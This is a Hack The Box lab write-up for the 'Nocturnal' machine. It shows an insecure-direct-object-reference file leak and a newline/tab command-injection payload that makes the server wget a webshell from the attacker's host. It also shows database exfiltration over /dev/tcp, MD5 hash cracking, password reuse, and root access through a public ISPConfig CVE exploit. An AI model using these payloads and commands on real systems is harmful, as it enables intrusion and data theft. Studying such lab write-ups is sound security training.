---
layout: post
title: 'Hack The Box - Machine Write-Up: Nocturnal'
created-at: 2025-05-04
categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
image: /docs/assets/2025-05/htb-nocturnal-0.png
---

## Enumeration and Analysis

When accessing the IP directly on the browser, I was redirected to `nocturnal.htb`. So I added the domain to my `/etc/hosts`:

```
> echo "10.10.11.64     nocturnal.htb" >> /etc/hosts
```

![Landing page](/docs/assets/2025-05/htb-nocturnal-1.png)

And scanning for the open ports:

> nmap nocturnal.htb

```
> nmap -p22,80 -sCV nocturnal.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 08:20 EDT
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.88 seconds
```

---

From here, I was able to register a new account and log into it. Here I could upload and retrieve my own files.

![Upload page](/docs/assets/2025-05/htb-nocturnal-2.png)

> I tried different code injection methods since the upload is limited to extensions pdf, doc, docx, xls, xlsx and odt.

When retrieving a file, the path expects two parameters: `username` and `file`. And when trying to retrieve a file that doesn't exist, a list of available files is shown on the page.

This page doesn't seem to validate the queried username against the current active session, meaning that I could see and access other user's files.

I used `wfuzz` to list usernames that return a different content size other than the "User not found error page":

```
> wfuzz -c -u "http://nocturnal.htb/view.php?username=FUZZ&file=shell.docx" -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -H "Cookie:PHPSESSID=0k9ccd53m5om1ou8nll9k8r7or" --hh 2985
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nocturnal.htb/view.php?username=FUZZ&file=shell.docx
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000000086:   200        128 L    247 W      3037 Ch     "admin"                                             
000000375:   200        128 L    253 W      3481 Ch     "amanda"                                            
...                                             
000006619:   200        128 L    248 W      3103 Ch     "me"                                                
000007640:   200        128 L    247 W      3037 Ch     "peter"                                             
000008867:   200        128 L    268 W      6130 Ch     "sol"                                               
000009382:   200        128 L    247 W      3037 Ch     "tobias"                                            

Total time: 38.68700
Processed Requests: 10177
Filtered Requests: 10152
Requests/sec.: 263.0599    
```

## Admin access

Looking through the files of the found users, `amanda` has a file called `privacy.odt` with the following content:

```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

Logging in as `amanda`, it looks like she has admin access:

![Amanda's page](/docs/assets/2025-05/htb-nocturnal-3.png)

![Admin's page](/docs/assets/2025-05/htb-nocturnal-4.png)

From this page, I can access the source code and create backups.

Looking at the source code of the admin page, the building of the `zip` command looks really problematic, and susceptible to command injection.

I tried a lot of different payloads, but what worked out was fuzzing with [this](https://github.com/payloadbox/command-injection-payload-list) command injection wordlist. Specifically the payload `%0Aid` which gave back:

```
id: extra operand '.'
Try 'id --help' for more information.
```

And `%0Aid%0A`, which gave back

```
sh: 3: backups/backup_2025-05-05.zip: Permission denied
```

It looks like I can use an encoded line break as a command delimiter.

After some more testing, I saw that a encoded tab `%09` works as a space for the commands (thank you Claude).

Using these two substitutions I was able to execute a `wget` and download a webshell to the target machine using the following payload: `%0A/usr/bin/wget%09<tun0 ip>:1337/shell.php%0A`.

This essentially translates to this when getting parsed:

```
-LINE BREAK-
/usr/bin/wget -TAB- <tun0 ip>:1337/shell.php -LINE BREAK-
```

Transforming the final command into:

```
zip -x './backups/*' -r -P 
/usr/bin/wget	<tun0 ip>:1337/shell.php
 backups/backup_2025-05-05.zip > logfile.txt 2>&1 &
```

And even though I got a `sh: 3: backups/backup_2025-05-05.zip: not found` error on the page (because the command on line 3 is not valid), I could see a hit on the API: 

```
> python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
<tun0 ip> - - [05/May/2025 xx:xx:xx] "GET /shell.php HTTP/1.1" 200 -
```

And refreshing the page, I can also see the file available on the root directory.

## Lateral movement

Looking through the directory (and remembering earlier code), there is a `sqlite` database under `../nocturnal_database/nocturnal_database.db`. I can use retrieve the file using `netcat`.

Attacker machine:
```
> nc -nvlp 1339 > database.db
```

Target machine:
```
> cat ../nocturnal_database/nocturnal_database.db > /dev/tcp/<tun0 ip>/1339
```

The database has two tables, `uploads` and `users`.

```
sqlite> SELECT * FROM users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
```

I remember earlier when looking through the code on the registration page, the password is stored as a simple MD5:

```
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = md5($_POST['password']);

    $stmt = $db->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);

    if ($stmt->execute()) {
        $_SESSION['success'] = 'User registered successfully!';
        header('Location: login.php');
        exit();
    } else {
        $error = 'Failed to register user.';
    }
}
?>

...
```

So this is a very fast process:

```
> hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```

This hash matches the user `tobias`. Checking for password reuse on SSH, we are in 😎.

```
tobias@nocturnal:~$ cat user.txt 
<user flag>
```

And we have the user flag.

## Privilege escalation

Checking for commands that have sudo available, there are none:

```
tobias@nocturnal:~$ sudo -l
[sudo] password for tobias: 
Sorry, user tobias may not run sudo on nocturnal.
```

Checking connected sockets, there are some interesting open ports:

```
tobias@nocturnal:~$  ss -lnt
State                 Recv-Q                Send-Q                               Local Address:Port                                  Peer Address:Port
LISTEN                0                     4096                                     127.0.0.1:8080                                       0.0.0.0:*
LISTEN                0                     511                                        0.0.0.0:80                                         0.0.0.0:*
LISTEN                0                     5                                          0.0.0.0:8081                                       0.0.0.0:*
LISTEN                0                     4096                                 127.0.0.53%lo:53                                         0.0.0.0:*
LISTEN                0                     128                                        0.0.0.0:22                                         0.0.0.0:*
LISTEN                0                     10                                       127.0.0.1:25                                         0.0.0.0:*
LISTEN                0                     70                                       127.0.0.1:33060                                      0.0.0.0:*
LISTEN                0                     151                                      127.0.0.1:3306                                       0.0.0.0:*
LISTEN                0                     10                                       127.0.0.1:587                                        0.0.0.0:*
LISTEN                0                     128                                           [::]:22                                            [::]:*
```

Port `80` is the `nocturnal.htb` website we just came from. I was unable to connect to `8081`:

```
tobias@nocturnal:~$ curl 0.0.0.0:8081
curl: (7) Failed to connect to 0.0.0.0 port 8081: Connection refused
```

But checking port `8080`, it looks like there is a available `ISPConfig` page:

```
tobias@nocturnal:~$ wget 127.0.0.1:8080
...
Saving to: ‘index.html’
...

tobias@nocturnal:~$ cat index.html 
<!DOCTYPE html>
<html lang='en'>
<head>
  <meta charset='utf-8' />

  <title>ISPConfig</title>

  <meta name='viewport' content='width=device-width, user-scalable=yes'>
  <meta name='description' lang='en' content='' />
  <meta name='keywords' lang='en' content='' />

 <link rel='apple-touch-icon' sizes='180x180' href='/themes/default/assets/favicon/apple-touch-icon.png'>
 <link rel='icon' type='image/png' sizes='32x32' href='/themes/default/assets/favicon/favicon-32x32.png'>
...
```

Port `8080` is not accessible from outside the machine, so I had to setup a SSH port forwarding:

```
> ssh -L 9090:localhost:8080 tobias@nocturnal.htb
```

![ISP Config page](/docs/assets/2025-05/htb-nocturnal-5.png)

Trying out different username/password combinations, `admin` user uses the same password that `tobias` does.

After some some messing around, I saw online that `ISP Config` is a well known product, and it also has an well known vulnerability: [CVE-2023-46818](https://github.com/ajdumanhug/CVE-2023-46818).

All I had to do was get the Python payload to the machine and:
```
tobias@nocturnal:/tmp$ python3 CVE-2023-46818.py http://localhost:8080 admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_2340f493b264f3459b59c6ab
[+] CSRF Key: 172b4c98ebd3375e56c1f50adf0e1fe9c2dae2cf
[+] Injecting shell payload...
[+] Shell written to: http://localhost:8080/admin/sh.php
[+] Launching shell...

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)

ispconfig-shell# cat /root/root.txt
<root flag>
```

## Review

This one was by far the hardest machine I've played so far. The average review on HTB is late easy to early medium, and I can definitely agree with this.

I ended up loosing a lot of time on simple things, like the password reuse from `tobias` on the `ISP Config` web service. This could have been a little more obvious than simply guessing. Maybe a `is_admin` field on the sqlite database user table could hint towards this route.

The password reuse there is believable, but it is kind of a wild jump, specially having the knowledge that `amanda` was the one with admin rights on the main web service.
